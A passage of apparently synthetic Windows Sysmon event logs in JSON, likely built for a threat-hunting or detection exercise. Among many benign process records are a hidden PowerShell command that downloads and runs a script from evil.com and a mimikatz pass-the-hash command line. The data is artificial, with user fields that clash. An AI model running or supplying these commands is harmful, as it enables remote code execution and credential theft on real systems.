    "UserName": "SYSTEM",
    "UtcTime": "2024-03-10T19:34:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "1132",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=1430adc47670eafe7fb68ca675cdd534199ec36063bed1127b0d872af24bf8a2"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-20T13:05:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "1582",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=75c22bb0e7cd447ba8e7ced9c7aa00866eb79f13f281ebe5268a2137c54c3f9e"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "bob",
    "UtcTime": "2024-03-10T10:24:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "3723",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=09ae458f455beb42707dbe87432834648eb74b0ed660678de4ae6fbd6327765b"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-25T07:24:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "1936",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=536c158456f15e2d3ca06c6e639b295de0efd36fea9eb91f713c240b2392538f"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-03",
    "UtcTime": "2024-03-04T00:36:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "DestinationIp": "10.0.0.173",
      "DestinationPort": 445,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.28",
      "SourcePort": "55961"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-18T06:09:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "7578",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=2142fe84861b20ad640253258cc6077694f95bcf98f7bc99cada90ff24d90d3e"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "charlie",
    "UtcTime": "2024-03-11T18:50:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "3457",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=a496a61d68ff75df38ba54624931a9c639fc9f4713b2942e9b69973573cea871"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "charlie",
    "UtcTime": "2024-03-19T17:33:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "2510",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=419f776643d0614ed2b7297a677c4d87a0584e6853b76881186ec67aa9e41bab"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "charlie",
    "UtcTime": "2024-03-05T13:28:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "5516",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=bf3c3716bdc499c95e3e24988677e6a49307b6dc6a0a81db72df3461fc9b3929"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-15T14:29:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "7284",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=8f079146df20b4e0c0ebe7a10373a747e7a93f6521f37350eb1521b4dd6a0efa"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "alice",
    "UtcTime": "2024-03-26T14:48:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "5654",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=2f96c91145041369969ec538f702493e2b57a8a76cdb0d7e68ca96b65fca7e97"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "bob",
    "UtcTime": "2024-03-01T18:56:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "1905",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=c446199ed0e51c8b8e5174ba1c78039fe582fd06dd1bc12d28ff9d82cbd842a0"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "dave",
    "UtcTime": "2024-03-26T21:06:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "8321",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=f74a138744ef134684f10604264967b46ab717a2f81f5731678b212f443220b2"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "bob",
    "UtcTime": "2024-03-05T11:44:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "9580",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=9f8c1ac2f099f5c0b0c2686e98099d7641d90cd9a70f446fa68cd10ad130a418"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "charlie",
    "UtcTime": "2024-03-22T13:19:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "1016",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=7027f0bc81137e83b94b3bf02f34fdffd0af94273b22562df821414bcee36821"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "dave",
    "UtcTime": "2024-03-01T08:12:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "CommandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "6787",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=e48fd356ca8e81a7bcec298955038bb8cac0d61215f223b89a72bf24fabaa93b"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "charlie",
    "UtcTime": "2024-03-05T19:09:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "4468",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=6664e06e8ccb227bc59847e6239e9400de4c21f52049ebb25a79f1909458818e"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "charlie",
    "UtcTime": "2024-03-02T15:17:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "7651",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=c40dfbcb679532cd0543ae5a232bdeedce66fc8c72a2b8fe91dbef6db5b25d73"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-08T14:33:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "4263",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=4951776ce439f238a40bb135d629d27a4afc1c0849fecb55508304bd215535ee"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "charlie",
    "UtcTime": "2024-03-16T23:47:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "9198",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=78eab43f8eeb5b7a06bd0ad5b43451c037a9547b1226b2f70c80041f4ea45fc8"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "charlie",
    "UtcTime": "2024-03-27T00:26:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "1013",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=a6252575da80ff9b447f0e08d842c1ca7b815e08f02bf9a57ea3138f305361fc"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "alice",
    "UtcTime": "2024-03-17T04:00:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "3567",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=b590233fb6ee15ed2b3a7c46120d82781b337f57f496b86883bdedda50ec010a"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-08",
    "UtcTime": "2024-03-27T14:23:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "DestinationIp": "10.0.0.243",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.7",
      "SourcePort": "57508"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "bob",
    "UtcTime": "2024-03-19T02:05:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "6159",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=c8f8ac890a5b19e545741df8fe71c82e4f29afb01e955b1ee135d74c762f1335"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "administrator",
    "UtcTime": "2024-03-24T21:45:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "5530",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=dba9863ad28e32807407269ede70f9fffa0aa17d91241f2a901c7f4b0c5bbe91"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "bob",
    "UtcTime": "2024-03-21T18:54:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "3700",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=0d5b5699d5be3f258fe5c5e453f748d497d82522de8d2dd1bde3b651e80c2520"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "dave",
    "UtcTime": "2024-03-01T16:52:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "5627",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=7ec5e7fc3d41302861f476f137147587f0d1dae3c427b69ca0088dbe7935e5ef"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "charlie",
    "UtcTime": "2024-03-28T14:47:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "3719",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=0b5ab60c2c8e917487b10f3fb90fdff4bc9eac417e0abcf91d701d5f935b5497"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "alice",
    "UtcTime": "2024-03-21T17:11:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "7362",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=de742d46a93cccaa7a7a80e432f9ed8c0a2c278b434a6276618605b0d8f2b40b"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-01T11:16:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "6597",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=03de4c3695275ec6215ce6eb1fd96ab14bf951bc5f60571ee7a0c84de6215b48"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "administrator",
    "UtcTime": "2024-03-01T10:06:00Z",
    "EventData": {
      "Image": "C:\\tools\\mimikatz.exe",
      "CommandLine": "mimikatz sekurlsa::pth /user:administrator /ntlm:aad3b435b51404eeaad3b435b51404ee /run:cmd.exe",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-29T19:34:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "9375",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=f11dd4e06fd3bb094f3c96dbca6ed85357b0a0a5011f0ca0e6bdc388f80da46b"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "charlie",
    "UtcTime": "2024-03-07T00:55:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "9515",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=457dc5ebbea44829971b68244db36a1dc019f2a569eb7d8a888c20e7b81fa01f"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "charlie",
    "UtcTime": "2024-03-13T15:46:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "2518",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=cb879b269fb64f76a51850097f0409cb8dab8de8dfaa5059b8dbce6d0b6457df"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "charlie",
    "UtcTime": "2024-03-24T07:36:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "1829",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=b6586c0f35887ac7ebe15c5913bb7f036b50ae703ed2e1b3e71c9059b4b1dde4"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-08T17:47:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "8865",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=ee4c1bc8e9140654797431baf103159779f30f8ae8328389e99da5ad5b014ee7"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-25T07:42:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "4196",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=0c291248693b09ea7a6e4447c98a2661c7e7a95b4bc30d95c4e9bca37402c8e0"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "administrator",
    "UtcTime": "2024-03-26T08:43:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "6224",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=475eaad00f96fa89ec794b1d78a63b85cadd8c7aff95996b530d175692f374f3"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-05",
    "UtcTime": "2024-03-29T12:15:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "DestinationIp": "10.0.0.123",
      "DestinationPort": 80,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.200",
      "SourcePort": "59223"
    }
  },
  {
    "EventID": 4624,
    "Computer": "WORKSTATION-02",
    "UserName": "dave",
    "UtcTime": "2024-03-13T23:11:00Z",
    "EventData": {
      "SubjectUserName": "charlie",
      "SubjectDomainName": "CORP"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-27T15:23:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "1965",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=cf5fe829d2e85832f77a4c58c5cb85e11c93ea4eca4956df9195e1dc8fe2b037"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-11T05:32:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "8792",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=1d31e5a9d31c480dfb57d428570fca51cb0e913b3d5c17fca655dd56eeaebd76"
    }
  },
